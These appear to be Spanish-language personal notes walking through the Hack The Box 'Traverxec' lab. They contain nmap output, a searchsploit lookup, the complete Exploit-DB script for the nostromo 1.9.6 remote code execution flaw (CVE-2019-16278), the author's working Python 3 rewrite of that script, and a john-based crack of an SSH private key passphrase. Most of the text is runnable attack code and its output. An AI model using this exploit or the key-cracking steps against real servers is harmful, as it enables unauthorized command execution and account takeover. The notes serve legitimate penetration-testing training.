### Nmap
```js
┌──(pelado㉿kali)-[~/OSCP/HTB/Labs/Traverxec]
└─$ nmap 10.10.10.165        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 21:25 EDT
Nmap scan report for 10.10.10.165 (10.10.10.165)
Host is up (0.15s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.69 seconds
```

- Revisamos solo los puertos 22 y 80
```js
┌──(pelado㉿kali)-[~/OSCP/HTB/Labs/Traverxec]
└─$ nmap 10.10.10.165 -p22,80 -sCV 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-25 21:27 EDT
Nmap scan report for 10.10.10.165 (10.10.10.165)
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Puerto 80
- Pagina web sin nada interesante
![[Pasted image 20240625222931.png]]

Lo interesante es el servicio que corre `nostromo 1.9.6`, que tiene un exploit publico.

Nostromo Port 80
https://www.exploit-db.com/exploits/47837
https://portswigger.net/daily-swig/nostromo-web-servers-exposed-by-resurrected-rce-vulnerability
https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html
http://www.nazgul.ch/dev_nostromo.html

```js
┌──(pelado㉿kali)-[~/OSCP/HTB/Labs/Traverxec]
└─$ searchsploit nostromo   
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)                                                      | multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                                                                                    | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                                                      | linux/remote/35466.sh
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```js
┌──(pelado㉿kali)-[~/OSCP/HTB/Labs/Traverxec]
└─$ searchsploit -m 47837.py
  Exploit: nostromo 1.9.6 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/47837
     Path: /usr/share/exploitdb/exploits/multiple/remote/47837.py
    Codes: CVE-2019-16278
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/pelado/OSCP/HTB/Labs/Traverxec/47837.py
```

- Exploit
```python
┌──(pelado㉿kali)-[~/OSCP/HTB/Labs/Traverxec]
└─$ cat 47837.py 
# Exploit Title: nostromo 1.9.6 - Remote Code Execution
# Date: 2019-12-31
# Exploit Author: Kr0ff
# Vendor Homepage:
# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz
# Version: 1.9.6
# Tested on: Debian
# CVE : CVE-2019-16278

cve2019_16278.py

#!/usr/bin/env python

import sys
import socket

art = """

                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/



"""

help_menu = '\r\nUsage: cve2019-16278.py <Target_IP> <Target_Port> <Command>'

def connect(soc):
    response = ""
    try:
        while True:
            connection = soc.recv(1024)
            if len(connection) == 0:
                break
            response += connection
    except:
        pass
    return response

def cve(target, port, cmd):
    soc = socket.socket()
    soc.connect((target, int(port)))
    payload = 'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{} 2>&1'.format(cmd)
    soc.send(payload)
    receive = connect(soc)
    print(receive)

if __name__ == "__main__":

    print(art)

    try:
        target = sys.argv[1]
        port = sys.argv[2]
        cmd = sys.argv[3]

        cve(target, port, cmd)

    except IndexError:
        print(help_menu)  
```

- Al tratar de ejecutarlo me daba este error
```js
┌──(pelado㉿kali)-[~/OSCP/HTB/Labs/Traverxec]
└─$ python3 47837.py 10.10.10.165 80 id


                                        _____-2019-16278
        _____  _______    ______   _____\       _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       |     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  | \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/




Traceback (most recent call last):
  File "/home/pelado/OSCP/HTB/Labs/Traverxec/47837.py", line 67, in <module>
    cve(target, port, cmd)
  File "/home/pelado/OSCP/HTB/Labs/Traverxec/47837.py", line 54, in cve
    soc.send(payload)
TypeError: a bytes-like object is required, not 'str'

```


Para hacer que el script funcione en Python 3, hay que hacer algunas modificaciones menores debido a las diferencias en el manejo de cadenas y sockets entre Python 2 y Python 3. 

```python
#!/usr/bin/env python3

import sys
import socket

art = """
                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    
"""

help_menu = '\r\nUsage: cve2019-16278.py <Target_IP> <Target_Port> <Command>'

def connect(soc):
    response = b""  # Usamos b"" para indicar que estamos trabajando con bytes
    try:
        while True:
            connection = soc.recv(1024)
            if len(connection) == 0:
                break
            response += connection
    except Exception as e:
        print(f"Error: {e}")
    return response.decode('utf-8', errors='ignore')  # Decodificamos los bytes a una cadena UTF-8

def cve(target, port, cmd):
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Creamos un socket IPv4 TCP
    soc.connect((target, int(port)))
    payload = f'POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n{cmd} 2>&1'
    soc.send(payload.encode())  # Codificamos la cadena a bytes antes de enviarla
    receive = connect(soc)
    print(receive)

if __name__ == "__main__":
    print(art)
    
    try:
        if len(sys.argv) < 4:
            print(help_menu)
        else:
            target = sys.argv[1]
            port = sys.argv[2]
            cmd = sys.argv[3]
            cve(target, port, cmd)
    except Exception as e:
        print(f"Error: {e}")
```

### Cambios Realizados:

1. **Bytes vs. Cadena de texto:** En Python 3, las operaciones de socket manejan bytes en lugar de cadenas de texto como en Python 2. Por lo tanto, debemos asegurarnos de codificar las cadenas de texto antes de enviarlas y decodificar las respuestas recibidas del socket.
2. **Manejo de Excepciones:** En Python 3, las excepciones deben ser capturadas de manera explícita. He ajustado el bloque `connect()` para manejar excepciones de manera más precisa.
3. **Argumentos de Línea de Comandos:** La verificación de los argumentos de línea de comandos (`sys.argv`) se realiza para asegurar que se proporcionen los tres argumentos necesarios (`<Target_IP>`, `<Target_Port>`, `<Command>`).
4. **Uso de f-strings:** Se ha utilizado f-strings para una mejor legibilidad y manejo de cadenas formateadas.





























Crack a id_rsa
https://reddyyz.medium.com/cracking-ssh-rsa-private-keys-ead3c126df6b

```js
┌──(pelado㉿kali)-[~/…/Traverxec/home/david/.ssh]
└─$ ssh2john id_rsa > id_rsa.txt   

┌──(pelado㉿kali)-[~/…/Traverxec/home/david/.ssh]
└─$ john id_rsa.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 20 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)     
1g 0:00:00:00 DONE (2024-06-25 22:15) 16.66g/s 2666p/s 2666c/s 2666C/s 123456..david
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


https://gtfobins.github.io/gtfobins/journalctl/